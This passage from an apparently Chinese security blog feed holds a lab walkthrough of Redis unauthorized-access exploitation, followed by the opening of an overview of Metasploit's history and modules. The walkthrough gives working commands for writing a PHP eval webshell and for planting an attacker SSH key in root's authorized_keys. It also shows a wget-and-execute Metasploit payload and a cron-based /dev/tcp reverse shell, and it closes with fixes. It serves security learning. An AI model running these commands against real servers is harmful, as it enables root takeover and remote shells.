src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.18.55.png" style="zoom:50%;"><p>无法访问，但是能ping通192.168.52.4。</p><h3 id="2-2-3-关闭centos7的防火墙"><a href="#2-2-3-关闭centos7的防火墙" class="headerlink" title="2.2.3 关闭centos7的防火墙"></a>2.2.3 关闭centos7的防火墙</h3><p>查看防火墙状态：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl status firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.26.41.png" style="zoom:50%;"><p>停止防火墙：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl stop firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>关闭防火墙之后访问测试成功：</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.27.33.png" style="zoom:50%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.32.02.png" alt="用4.0.10的客户端也能访问，没必要重新安装2.8.17版本" style="zoom:40%;"><h3 id="2-2-4-漏洞测试"><a href="#2-2-4-漏洞测试" class="headerlink" title="2.2.4 漏洞测试"></a>2.2.4 漏洞测试</h3><h4 id="1）未授权访问测试"><a href="#1）未授权访问测试" class="headerlink" title="1）未授权访问测试"></a>1）未授权访问测试</h4><p>测试目标靶机是否存在未授权访问,下图说明靶机存在未授权访问，导致信息泄露。</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.35.12.png" style="zoom:40%;"><h3 id="2-2-5-启动apache-web服务"><a href="#2-2-5-启动apache-web服务" class="headerlink" title="2.2.5 启动apache web服务"></a>2.2.5 启动apache web服务</h3><p>为了复现写入webshell的利用方法，安装启动apache web服务。</p><h4 id="1）安装-Apache"><a href="#1）安装-Apache" class="headerlink" title="1）安装 Apache"></a>1）安装 Apache</h4><p>CentOS 7 使用 <code>yum</code> 作为包管理器。要安装 Apache HTTP 服务器，运行以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> httpd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2）启动-Apache-服务"><a href="#2）启动-Apache-服务" class="headerlink" title="2）启动 Apache 服务"></a>2）启动 Apache 服务</h4><p>安装完成后，你可以使用 <code>systemctl</code> 命令来启动 Apache 服务：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl start httpd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.40.44.png" style="zoom:40%;"><h4 id="3）访问测试"><a href="#3）访问测试" class="headerlink" title="3）访问测试"></a>3）访问测试</h4><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.41.50.png" style="zoom:30%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"&lt;?php phpinfo(); ?&gt;"</span> <span class="token operator">&gt;</span> /home/www/index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.57.12.png" style="zoom:50%;"><p>访问之后发现php没有被解析。</p><p>需要安装并配置php解析。</p><h3 id="2-2-6-安装PHP"><a href="#2-2-6-安装PHP" class="headerlink" title="2.2.6 安装PHP"></a>2.2.6 安装PHP</h3><h4 id="1-安装-PHP"><a href="#1-安装-PHP" class="headerlink" title="1) 安装 PHP"></a>1) 安装 PHP</h4><p>CentOS 7 默认使用 <code>yum</code> 作为包管理器。要安装 PHP，运行以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> php php-mysqlnd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里 <code>php-mysqlnd</code> 是 MySQL 的 PHP 扩展，如果你的 PHP 脚本需要与 MySQL 数据库交互，这个扩展是必要的。</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.50.34.png" style="zoom:50%;"><h4 id="2）配置-Apache-以处理-PHP"><a href="#2）配置-Apache-以处理-PHP" class="headerlink" title="2）配置 Apache 以处理 PHP"></a>2）配置 Apache 以处理 PHP</h4><p>不需要特别的配置，重启一下http服务即可。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart httpd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2014.59.32.png" style="zoom:50%;"><h2 id="2-3-漏洞利用"><a href="#2-3-漏洞利用" class="headerlink" title="2.3 漏洞利用"></a>2.3 漏洞利用</h2><h3 id="2-3-1-写webshell"><a href="#2-3-1-写webshell" class="headerlink" title="2.3.1 写webshell"></a>2.3.1 写webshell</h3><p>利用条件：目标开启了web服务器,并且知道web路径(可以利用phpinfo或者错误暴路径等)，还需要具有读写增删改查权限。</p><ul><li>写入webshell</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/www/htmlconfig <span class="token builtin class-name">set</span> dbfilename sxkhack.php<span class="token builtin class-name">set</span> webshell <span class="token string">"<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>&lt;?php eval(<span class="token variable">$_POST</span>['sxk']);?&gt;<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span>save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>注意：”\r\n”是回车换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2015.24.15.png" style="zoom:40%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2015.23.14.png" style="zoom:30%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2015.23.49.png" alt="getshell" style="zoom:50%;"><p>成功getshell。</p><h3 id="2-3-2-通过写入SSH公钥实现SSH登录"><a href="#2-3-2-通过写入SSH公钥实现SSH登录" class="headerlink" title="2.3.2 通过写入SSH公钥实现SSH登录"></a>2.3.2 通过写入SSH公钥实现SSH登录</h3><h4 id="1）ssh密钥登录的原理"><a href="#1）ssh密钥登录的原理" class="headerlink" title="1）ssh密钥登录的原理"></a>1）ssh密钥登录的原理</h4><p>通过ssh可以远程登录另外一台电脑。</p><p>ssh登录有两种一个是密码登录，一个是密钥登录。公钥登录是为了解决每次登录服务器都要输入密码的问题，流行使用RSA加密方案，主要流程包含：</p><ol><li>客户端生成RSA公钥和私钥</li><li>客户端将自己的公钥存放到服务器</li><li>客户端请求连接服务器，服务器将一个随机字符串发送给客户端</li><li>客户端根据自己的私钥加密这个随机字符串之后再发送给服务器</li><li>服务器接受到加密后的字符串之后用公钥解密，如果正确就让客户端登录，否则拒绝。这样就不用使用密码了。</li></ol><h4 id="2）利用前提"><a href="#2）利用前提" class="headerlink" title="2）利用前提"></a>2）利用前提</h4><ul><li><p>当redis以root身份运行。</p></li><li><p>靶机redis链接未授权，在攻击机上能用redis-cli连上。</p></li><li><p>存在/root/.ssh目录</p></li></ul><p>1）如果不存在我们可以通过一句话木马连接蚁剑创建目录，但是webshell获取的权限比较低，没有权限访问/root目录。 </p><p>2）如果是自己搭建的靶场就自行创建一个。</p><p>3）此外，有种说法是靶机被使用ssh root@ip登录过就会生成.ssh文件，但是我在centos7上测试不是这样的，还是没有.ssh目录，如果是使用用户名密码认证登录的方式应该不会有.ssh的目录。正确的说法应该是目标机器配置过通过ssh公私密钥登录之后才会存在.ssh文件，具体操作见本站《ssh服务公私钥认证》一文。</p><h4 id="3）原理"><a href="#3）原理" class="headerlink" title="3）原理"></a>3）原理</h4><p>原理就是在数据库中插入一条数据，将本机的公钥作为value，key值可以随意设置，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized_keys，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key。</p><h4 id="4）kali生成公私钥对（如果本身就有可以不生成）"><a href="#4）kali生成公私钥对（如果本身就有可以不生成）" class="headerlink" title="4）kali生成公私钥对（如果本身就有可以不生成）"></a>4）kali生成公私钥对（如果本身就有可以不生成）</h4><p>如果没有可以用如下方法生成一对：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-t</span> rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>ssh-keygen</code> 是一个用于生成 SSH 密钥对的命令行工具。当你运行 <code>ssh-keygen -t rsa</code> 命令时，它会创建一对新的 RSA 密钥，包括一个私钥和一个公钥。以下是该命令的详细解释和使用步骤：</p><p>命令解释</p><ul><li><code>ssh-keygen</code>：这是生成、管理和转换认证密钥的命令。</li><li><code>-t rsa</code>：这个选项指定了密钥的类型。在这里，<code>rsa</code> 表示使用 RSA 加密算法生成密钥对。</li></ul></blockquote><h4 id="5）将公钥写入key-txt文件"><a href="#5）将公钥写入key-txt文件" class="headerlink" title="5）将公钥写入key.txt文件"></a>5）将公钥写入key.txt文件</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>echo <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span><span class="token function">cat</span> id_rsa.pub<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> key.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>echo的-e参数：</p><p><code>-e</code> 参数是一个常用的选项，它允许 <code>echo</code> 命令解释一些特殊的字符和转义序列。这些转义序列可以控制文本的格式，如换行、制表符、字符串的开始和结束等。</p><p>以下是一些与 <code>-e</code> 参数一起使用时有效的转义序列：</p><ul><li><code>\n</code>：换行符，用于在输出中创建一个新行。</li><li><code>\t</code>：制表符（水平制表符），用于在输出中创建一个水平制表。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Hello,<span class="token entity" title="\n">\n</span>World!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令将在两行输出 “Hello,” 和 “World!”。</p></blockquote><p>（前后用\n换行，避免和redis里其他缓存数据混合）。</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2016.20.04.png" style="zoom:40%;"><h4 id="6）把key-txt文件内容写入redis缓冲"><a href="#6）把key-txt文件内容写入redis缓冲" class="headerlink" title="6）把key.txt文件内容写入redis缓冲"></a>6）把key.txt文件内容写入redis缓冲</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /root/key.txt <span class="token operator">|</span>./redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.52.4 <span class="token parameter variable">-x</span> <span class="token builtin class-name">set</span> pub<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>在 Redis 2.8.17 版本中，<code>redis-cli</code> 工具的 <code>-x</code> 参数用于执行一个 Redis 命令。</p></blockquote><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2016.36.03.png" style="zoom:50%;"><h4 id="7）设置redis的dump文件路径为-root-ssh且文件名为authorized-keys"><a href="#7）设置redis的dump文件路径为-root-ssh且文件名为authorized-keys" class="headerlink" title="7）设置redis的dump文件路径为/root/.ssh且文件名为authorized_keys"></a>7）设置redis的dump文件路径为/root/.ssh且文件名为authorized_keys</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.52.4config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.sshconfig <span class="token builtin class-name">set</span> dbfilename authorized_keyssave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><pre class="line-numbers language-none"><code class="language-none">config set dir /root/.ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>这个命令用于设置 Redis 的配置参数。在这里，它试图将 Redis 的持久化文件目录设置为 <code>/root/.ssh</code>。</li></ul><pre class="line-numbers language-none"><code class="language-none">config set dbfilename authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>这个命令也是用于设置 Redis 的配置参数。在这里，它试图将 Redis 数据库的持久化文件名设置为 <code>authorized_keys</code>。</li></ul><p>在 Redis 中，<code>config set</code> 命令用于在运行时动态设置配置参数。以下是 <code>dir</code> 和 <code>dbfilename</code> 参数的作用：</p><ol><li><code>config set dir /path/to/directory</code><ul><li>这个命令用于设置 Redis 数据库文件的存储目录。<code>dir</code> 参数指定了持久化文件（如 RDB 快照）的保存路径。默认情况下，Redis 会将数据文件保存在当前工作目录下，但为了数据安全，建议显式设置一个专门的目录来存储这些文件。通过修改 <code>dir</code> 参数，你可以指定一个不同的路径来存放这些持久化文件，以避免误删除或数据丢失的风险。</li></ul></li><li><code>config set dbfilename filename</code><ul><li>这个命令用于设置 Redis 数据库的持久化文件名。<code>dbfilename</code> 参数指定了 RDB 快照文件的名称。默认情况下，这个文件名是 <code>dump.rdb</code>。通过修改 <code>dbfilename</code> 参数，你可以为 RDB 快照指定一个自定义的文件名。这在管理多个 Redis 实例或需要区分不同数据库快照时非常有用。</li></ul></li></ol></blockquote><p>这里先将攻击者的公钥保存到缓冲区，然后设置数据库文件，<code>SAVE</code> 命令用于创建当前数据库的快照并保存到磁盘上的 RDB 文件，在这里就是把缓冲区中的数据刷到了/root/.ssh/authorized_keys中。</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2016.39.05.png" style="zoom:40%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2016.43.13.png" alt="靶机的ssh公钥已经被篡改" style="zoom:50%;"><h4 id="8）成功获得root权限的ssh-shell"><a href="#8）成功获得root权限的ssh-shell" class="headerlink" title="8）成功获得root权限的ssh shell"></a>8）成功获得root权限的ssh shell</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-i</span> ~/.ssh/id_rsa root@192.168.52.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>-i ~/.ssh/id_rsa</code>：这个选项指定了用于认证的私钥文件。<code>-i</code> 代表 identity file，即身份文件，<code>~/.ssh/id_rsa</code> 是私钥文件的路径。</p></blockquote><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2016.44.08.png" style="zoom:40%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2016.44.57.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token number">192.168</span>.52.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.03.26.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> root@192.168.52.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.04.15.png" style="zoom:50%;"><p>成功获得root权限的ssh shell。</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2016.58.20.png" a style="zoom:50%;"><p>真实的root用户登录时需要输入密码认证，因为此时服务器的ssh公钥已经被篡改为攻击者的公钥了。</p><h3 id="2-3-3-反弹shell上线metepreter（失败）"><a href="#2-3-3-反弹shell上线metepreter（失败）" class="headerlink" title="2.3.3 反弹shell上线metepreter（失败）"></a>2.3.3 反弹shell上线metepreter（失败）</h3><ul><li>msf构建payload，参数设置情况如下</li></ul><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.31.32.png" style="zoom:50%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.32.26.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-qO</span> sbWGQnnZ --no-check-certificate http://192.168.52.6:8080/YrdRCeRQ<span class="token punctuation">;</span> <span class="token function">chmod</span> +x sbWGQnnZ<span class="token punctuation">;</span> ./sbWGQnnZ<span class="token operator">&amp;</span> disown<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.35.50.png" style="zoom:50%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.36.22.png" style="zoom:50%;"><p>但是写入的数据有乱码，无法执行。</p><p>暂时想不到什么比较好的方法。</p><h3 id="2-3-4-普通反弹普通shell"><a href="#2-3-4-普通反弹普通shell" class="headerlink" title="2.3.4 普通反弹普通shell"></a>2.3.4 普通反弹普通shell</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.52.4config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cronconfig <span class="token builtin class-name">set</span> dbfilename root<span class="token builtin class-name">set</span> hahaha <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.52.4/8888 0&gt;&amp;1 <span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.26.21.png" alt="截屏2025-01-08 17.26.21" style="zoom:50%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.25.43.png" style="zoom:50%;"><p>服务器原来cron目录下没有root文件的，现在有了，并且内容是redis的缓存，有脏数据。</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.27.20.png" style="zoom:40%;"><blockquote><p>如果想清除一下缓存中之前写入的脏数据：</p><p>可以执行FLUSHDB或FLUSHALL：</p><p><code>FLUSHDB</code>：这个命令会删除当前数据库中的所有键。如果在 Redis 配置中启用了 <code>save</code> 选项，那么在执行 <code>FLUSHDB</code> 命令后，Redis 会异步地将这个状态保存到磁盘。</p><p><code>FLUSHALL</code>：这个命令会删除所有数据库中的所有键。与 <code>FLUSHDB</code> 类似，如果启用了持久化，这个命令也会触发保存操作。</p><p>执行之后可以save一下保存更改。</p></blockquote><p>这里的定时任务会每分钟执行一次。</p><p>攻击端kali监听8888端口，成功获取到root权限的shell</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.27.54.png" style="zoom:40%;"><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错。</p><p>防范措施：</p><ul><li><strong>设置密码认证</strong>：在Redis配置文件<code>redis.conf</code>中设置强密码，并启用认证功能。</li><li><strong>限制访问</strong>：通过防火墙规则限制Redis端口的访问，只允许信任的IP地址访问。</li><li><strong>绑定本地接口</strong>：将Redis绑定在本地接口（如127.0.0.1），避免暴露在公网上。</li><li><strong>定期更新</strong>：及时更新Redis到最新版本，以修复已知的安全漏洞。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞知识库 </tag>
            
            <tag> redis未授权访问 </tag>
            
            <tag> 未授权访问 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF-Metasploit</title>
      <link href="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/"/>
      <url>/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Metasploit-简介"><a href="#一、Metasploit-简介" class="headerlink" title="一、Metasploit 简介"></a>一、Metasploit 简介</h1><p>Metasploit 是一个开源的渗透测试开源软件，也是一个逐步发展成熟的漏洞研究与渗透测试代码开发平台（可扩展），此外也将成为支持整个渗透测试过程的安全技术集成开发与应用环境。</p><h1 id="二、诞生与发展"><a href="#二、诞生与发展" class="headerlink" title="二、诞生与发展"></a>二、诞生与发展</h1><p>Metasploit 项目最初是由HD Moore 在2003 年夏季创立，目标是成为渗透攻击研究与代码开发的一个开放资源。HD Moore在2003 年的10月发布了他的第一个基于Perl 语言(pl)的Metasploit 版本，当时一共集成了11个渗透攻击模块。在Spoonm 的帮助下，完全重写了Metasploit 的代码，并在2004 年4月发布了Metasploit v2.0，版本中已经包含了18个渗透攻击模块和27 个攻击载荷（payload），并提供了控制台终端，命令行和Web 三个使用接口。</p><p>在2004 年8月，HD 和Spoonm 带着最新发布的Metasploit v2.2 并在拉斯维加斯举办的BlackHat 全球黑客大会上进行了演讲。听众被Metasploit 的强大之处所折服，并一致认为：Metasploit 时代已经到来。更多的黑客加入Metasploit 核心开发团队与贡献渗透攻 击、载荷与辅助模块代码。</p><p>在2005 年的CanSecWest 黑客会议上，HD 和Spoonm 指出了Metasploit v2 体系框架中的一些难以解决的难题，包括：</p><ul><li><p>缺乏跨平台支持，特别是不能很好地运行在Windows 系统上。</p></li><li><p>很难支持自动化渗透攻击过程</p></li><li><p>Perl 语言的复杂性和缺点使得外部贡献者与用户规模增长不相适应</p></li><li><p>Perl 语言对一些复杂特性的支持能力较弱等。</p></li></ul><p>而且v2 版本是完全围绕着渗透攻击而设计的，对信息搜集与后渗透攻击阶段无法提供有效支持。经过18个月的时间，Metasploit 团队使用Ruby 语言完全重写了Metasploit ，并在2007 年5月发布了v3.0 版本，其中包含177 个渗透攻击模块、104 个攻击载荷模块以及30 个新引入的辅助模块（扫描爆破模块）。</p><p>Metasploit v3.0 的发布使得Metasploit 不在限于用作渗透攻击软件，而真正成为一个事实上的渗透测试技术研究与开发平台。</p><p>2009 年10月，Metasploit 项目被一家渗透测试技术领域的知名安全公司Rapid7 所收购。Rapid7 公司随后与2010 年10月推出了 Metasploit Express 和Pro 商业版本。</p><p>Metasploit v4.0 在2011 年8 月发布。v4.0 版本在渗透攻击、攻击载荷与辅助模块的数量上都有显著的扩展，此外还引入一种新的模块类型——后渗透攻击模块，以支持在渗透攻击环节中进行敏感信息搜集、内网拓展等一系列的攻击测试。</p><p>Metasploit v5.0 在2019 年1月份发布。Metasploit 5.0 使用了新的数据库，并提供了一种新的数据服务。新版本引入了新的规避机 制(evasion capabilities)，支持多项语言，框架建立在不断增长的世界级攻击性内容库的框架基础上。另外，此次更新还包括了可用性改进和大规模开发的支持，数据库和自动化 API 的改进等。</p><h1 id="三、为什么使用Metasploit"><a href="#三、为什么使用Metasploit" class="headerlink" title="三、为什么使用Metasploit"></a>三、为什么使用Metasploit</h1><p>渗透攻击是目前Metasploit 最强大和最具吸引力的核心功能，Metasploit 框架中集成了数百个针对主流操作系统平台上，不同网络服务与应用软件安全漏洞的渗透攻击模块，可以由用户在渗透攻击场景中根据漏洞扫描结果进行选择，并能够自由装配该平台上适用的具有指定功能的攻击载荷，然后通过自动化编码机制绕过攻击限制与检测措施，对目标系统实施远程攻击，获取系统的访问控制权。</p><p>除了渗透攻击之外，Metasploit 在发展过程中逐渐增加对渗透测试全过程的支持，包括情报搜集、威胁建模、漏洞分析、后渗透攻击与报告生成。</p><h2 id="3-1-情报搜集阶段"><a href="#3-1-情报搜集阶段" class="headerlink" title="3.1 情报搜集阶段"></a>3.1 情报搜集阶段</h2><p> Metasploit 一方面通过内建的一系列扫描器与查点辅助模块来获取远程服务器信息，另一方面通过插件机制集成调用Nmap、Nessus、OpenVAS 等业界著名的开源网络扫描工具，从而具备全面的信息搜集能力，为渗透攻击实施提供必不可少的精确情报。 </p><h2 id="3-2-威胁建模阶段"><a href="#3-2-威胁建模阶段" class="headerlink" title="3.2 威胁建模阶段"></a>3.2 威胁建模阶段</h2><p> 在搜集信息之后，Metasploit 支持一系列数据库命令操作直接将这些信息汇总至PostgreSQL、MySQL、SQLite 数据库中，并为用户提供易用的数据库查询命令，可以帮助渗透测试者对目标系统搜索到的情报进行威胁建模，从中找出最可行的攻击路径。</p><h2 id="3-3-漏洞分析阶段"><a href="#3-3-漏洞分析阶段" class="headerlink" title="3.3 漏洞分析阶段"></a>3.3 漏洞分析阶段</h2><p>  除了信息搜集环节能够直接扫描出一些已公布的安全漏洞之外，Metasploit 中还提供了大量的协议Fuzz 测试器与Web 应用漏洞探测分析模块，支持具有一定水平能力的渗透测试者在实际过程中尝试挖掘出0Day 漏洞，并对漏洞机理与利用方法进行深入分析，而这将为渗透攻击目标带来更大的杀伤力，并提升渗透测试流程的技术含金量。</p><h2 id="3-4-后渗透攻击阶段"><a href="#3-4-后渗透攻击阶段" class="headerlink" title="3.4 后渗透攻击阶段"></a>3.4 后渗透攻击阶段</h2><p>  在成功实施渗透攻击并获得目标系统的远程控制权之后，Metasploit 框架中另一个极具威名的工具Meterpreter 在后渗透攻击阶段提供了强大功能。</p><p>  Meterpreter 可以看作一个支持多操作系统平台，可以仅仅驻留于内存中并具备免杀能力的高级后门工具，Meterpreter 中实现了特权提升、信息攫取、系统监控、跳板攻击与内网拓展等多样化的功能特性，此外还支持一种灵活可扩展的方式来加载额外功能的后渗透攻击模块。</p><h2 id="3-5-报告生成阶段"><a href="#3-5-报告生成阶段" class="headerlink" title="3.5 报告生成阶段"></a>3.5 报告生成阶段</h2><p>​    Metasploit 框架获得的渗透测试结果可以输入至内置数据库中，因此这些结果可以通过数据查询来获取，并辅助渗透测试报告的写作。商业版的Metasploit Pro 具备了更加强大的报告生成功能，可以输出HTML、XML、Word 和PDF 格式的报告，把那个支持定制渗透测试报告模板。</p><h1 id="四、技术架构"><a href="#四、技术架构" class="headerlink" title="四、技术架构"></a>四、技术架构</h1><h2 id="4-1-辅助模块"><a href="#4-1-辅助模块" class="headerlink" title="4.1 辅助模块"></a>4.1 辅助模块</h2><p>Metasploit 为渗透测试的信息搜集环节提供了大量的辅助模块支持，包括针对各种网络服务的扫描与查点、构建虚假服务收集登录密码、口令猜测破解、敏感信息嗅探、探查敏感信息泄露、Fuzz 测试发掘漏洞、实施网络协议欺骗等模块。 </p><p>辅助模块能够帮助渗透测试者在渗透攻击之前取得目标系统丰富的情报信息。</p><h2 id="4-2-渗透攻击模块"><a href="#4-2-渗透攻击模块" class="headerlink" title="4.2 渗透攻击模块"></a>4.2 渗透攻击模块</h2><p>渗透攻击模块是利用发现的安全漏洞或配置弱点对目标系统进行攻击，以植入和运行攻击载荷，从而获取对远程目标系统访问权的代码组件。</p><h3 id="4-2-1-主动渗透攻击（攻击者主动出击）"><a href="#4-2-1-主动渗透攻击（攻击者主动出击）" class="headerlink" title="4.2.1 主动渗透攻击（攻击者主动出击）"></a>4.2.1 